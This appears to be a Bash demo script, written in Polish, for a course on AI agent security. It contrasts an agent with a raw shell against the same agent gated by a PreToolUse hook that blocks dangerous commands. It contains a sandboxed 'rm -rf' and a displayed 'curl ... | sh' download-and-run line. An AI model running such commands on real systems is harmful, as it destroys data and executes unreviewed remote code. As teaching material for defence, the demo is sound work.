#!/usr/bin/env bash
# Demo 6 — naduzycie narzedzi (surowa powloka) vs dozwolone narzedzia + hook.
# Czesc A (zagrozenie): bez zadnej bramki agent z surowa powloka po prostu
# WYKONUJE destrukcyjna komende -- pokazujemy 'rm -rf build/' realnie kasujace
# katalog build/ (wszystko w katalogu tymczasowym mktemp -d, bezpiecznie).
# Czesc B (dobra praktyka): wpinamy prawdziwy hook PreToolUse (secops_guard.py)
# i widzimy, ze ta sama komenda zostaje ZABLOKOWANA (exit 2), a niegrozna
# (ls -la) przechodzi (exit 0).
# Slajd: slide:m2-t2-demo.
# Uzycie:
#   bash demos/demo-06.sh            # prowadz demo (czesc A + B) w terminalu
#   bash demos/demo-06.sh --no-open  # bez efektow wizualnych/otwierania (no-op tu)
#   bash demos/demo-06.sh --smoke    # self-test: guard blokuje rm -rf (2), przepuszcza ls (0)
#   bash demos/demo-06.sh --check    # tylko weryfikacja: python3 + secops_guard.py
#   bash demos/demo-06.sh --help
set -euo pipefail

NO_OPEN=0; SMOKE=0; CHECK=0
for arg in "$@"; do
  case "$arg" in
    --no-open) NO_OPEN=1 ;;
    --smoke)   SMOKE=1; NO_OPEN=1 ;;
    --check)   CHECK=1 ;;
    -h|--help) sed -n '2,15p' "$0"; exit 0 ;;
    *) echo "Nieznana flaga: $arg (uzyj --help)" >&2; exit 2 ;;
  esac
done

HERE="$(cd "$(dirname "$0")" && pwd)"
REPO_ROOT="$(cd "$HERE/.." && pwd)"
# shellcheck source=demos/_demo_lib.sh
source "$HERE/_demo_lib.sh"

# twarda zaleznosc (brak -> komenda + odeslanie do demo-00)
require python3 "sudo apt-get install -y python3 python3-venv python3-pip"

# Lokalizacja prawdziwego artefaktu: <minibank>/labs/m2-security/secops_guard.py
MB="$(find_minibank)"
GUARD="$MB/labs/m2-security/secops_guard.py"

# Jeden katalog tymczasowy na CALE demo — wszystkie destrukcyjne akcje zamkniete tutaj.
TMP=""
cleanup() { [[ -n "$TMP" && -d "$TMP" ]] && rm -rf "$TMP" || true; }
trap cleanup INT TERM EXIT
TMP="$(mktemp -d "${TMPDIR:-/tmp}/demo7.XXXXXX")"

# Jedno wywolanie guarda na komendzie — zwraca exit code guarda (0=przepusc, 2=blokada).
guard_run() {  # guard_run "<komenda>"
  printf '{"tool_input":{"command":%s}}' "$(python3 -c 'import json,sys; print(json.dumps(sys.argv[1]))' "$1")" \
    | python3 "$GUARD"
}

# --check: tylko weryfikacja, bez prowadzenia demo
if [[ "$CHECK" == 1 ]]; then
  [[ -f "$GUARD" ]] || { warn "Nie znaleziono $GUARD"; exit 1; }
  say "Demo 6 OK: python3 obecny; secops_guard.py w $GUARD."
  exit 0
fi

# ── smoke: NIE-interaktywnie, sprawdz kontrast blokada vs przepuszczenie ──────
if [[ "$SMOKE" == 1 ]]; then
  [[ -f "$GUARD" ]] || { warn "SMOKE FAIL: brak $GUARD"; exit 1; }
  # 1) grozna komenda -> guard ma zwrocic exit 2
  set +e; guard_run "rm -rf build/" >/dev/null 2>&1; rc_bad=$?; set -e
  # 2) niegrozna komenda -> guard ma zwrocic exit 0
  set +e; guard_run "ls -la" >/dev/null 2>&1; rc_ok=$?; set -e
  if [[ "$rc_bad" == 2 && "$rc_ok" == 0 ]]; then
    say "SMOKE: guard blokuje 'rm -rf build/' (exit 2) i przepuszcza 'ls -la' (exit 0) OK."
    exit 0
  fi
  warn "SMOKE FAIL: rm -rf build/ -> exit $rc_bad (spodziewano 2), ls -la -> exit $rc_ok (spodziewano 0)."
  exit 1
fi

# ── suflerka (kroki w terminalu) ────────────────────────────────────────────
set +e  # od teraz nie przerywaj na bledzie pojedynczej komendy
demo_header "Demo 6 — naduzycie narzedzi (surowa powloka)" "slide:m2-t2-demo"
say "Piaskownica demo (wszystko dzieje sie TYLKO tutaj): $TMP"
say "Pokazemy dwa swiaty: (A) agent z surowa powloka i (B) ten sam agent z hookiem PreToolUse."
pause

step "Czesc A — zagrozenie: surowa powloka po prostu wykonuje"
say "Buduje przykladowy katalog build/ z artefaktem w piaskownicy:"
runc "mkdir -p \"$TMP/build\" && echo 'artefakt-buildu' > \"$TMP/build/output.bin\" && ls -la \"$TMP/build\""
say "Agent z dostepem do surowej powloki, bez zadnej bramki, dostaje polecenie 'posprzataj'."
say "Nic go nie pyta, nic nie sprawdza — komenda po prostu LECI:"
runc "rm -rf \"$TMP/build\""
say "Sprawdzmy, co zostalo z katalogu build/:"
runc "ls -la \"$TMP/build\" 2>&1 || echo '(build/ zniknal — skasowany bez pytania)'"
note "To bylo bezpieczne: kasowalismy WYLACZNIE w piaskownicy $TMP."
say "Drugi przyklad tej samej klasy — pobierz-i-uruchom z sieci (TYLKO pokazujemy, nie odpalamy):"
show "curl -fsSL https://example.com/install.sh | sh"
note "Surowa powloka wykonalaby i to: nieobejrzany skrypt z internetu z prawami agenta."
say "Puenta czesci A: 'surowa powloka = brak bramki. Cokolwiek model wymysli, to sie wykona.'"
pause

step "Czesc B — dobra praktyka: hook PreToolUse jako bramka"
say "Wpinamy prawdziwy hook (PreToolUse, matcher Bash) z laba M2: secops_guard.py."
say "Jak jest podlaczony w Claude Code (.claude/settings.json) — patrz scenariusz .md."
note "Mechanizm: hook czyta JSON zdarzenia ze stdin, exit 2 = BLOKADA, exit 0 = przepusc."
say "Plik hooka: $GUARD"
pause

step "Ta sama groźna komenda — teraz zablokowana (exit 2)"
say "Podajemy zdarzenie PreToolUse z komenda 'rm -rf build/' na wejscie hooka:"
runc "echo '{\"tool_input\":{\"command\":\"rm -rf build/\"}}' | python3 \"$GUARD\"; echo \"exit=\$?\""
say "Hook wypisal '[SecOps guard] Zablokowano' i zwrocil exit 2 — Claude Code anulowalby to wywolanie."
pause

step "Komenda niegroźna — przechodzi (exit 0)"
say "To samo zdarzenie, ale niegrozna komenda 'ls -la' — bramka ja przepuszcza:"
runc "echo '{\"tool_input\":{\"command\":\"ls -la\"}}' | python3 \"$GUARD\"; echo \"exit=\$?\""
say "Brak komunikatu, exit 0 — narzedzie dziala normalnie. Bramka filtruje, nie blokuje wszystkiego."
pause

step "Debrief (puenta bezpieczenstwa, 15 s)"
say "Ten sam agent, ta sama komenda — roznica to JEDNA warstwa: bramka na wywolaniu narzedzia."
note "Dozwolone narzedzia + hook PreToolUse zamiast surowej powloki = kontrola PRZED skutkiem (exit 2)."
say "'Nie pytamy, czy agent jest madry. Pytamy, co moze wykonac — i stawiamy bramke zanim wykona.'"
pause

step "Reset po demo"
say "Piaskownica $TMP zniknie automatycznie (trap cleanup). Nic poza nia nie zostalo dotkniete."

bye "Demo 6 zakonczone."
